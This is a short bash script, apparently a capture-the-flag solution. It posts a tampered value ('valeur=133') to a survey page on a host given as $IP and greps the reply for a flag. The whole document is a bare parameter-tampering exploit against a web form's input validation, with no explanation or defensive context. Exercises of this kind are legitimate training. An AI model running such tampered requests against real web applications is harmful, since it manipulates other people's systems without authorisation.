#!/bin/bash
curl "http://$IP/index.php?page=survey#" --data "sujet=2&valeur=133" 2>/dev/null | grep -i flag
